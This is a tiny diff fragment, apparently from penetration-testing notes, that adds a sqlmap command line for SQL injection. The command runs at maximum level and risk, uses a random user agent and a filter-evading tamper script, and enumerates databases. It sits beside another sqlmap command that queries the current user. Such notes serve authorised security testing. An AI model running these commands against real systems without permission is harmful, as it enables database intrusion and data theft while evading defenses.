@@ -44,5 +44,5 @@ sqlmap -p log -r request-cz.txt --current-user --level=2 --risk=2
 ```
 
 ```
-
+sqlmap.py -r request --batch --random-agent --tamper=space2comment --level=5 --risk=3 --drop-set-cookie --threads 10 --dbs
 ```
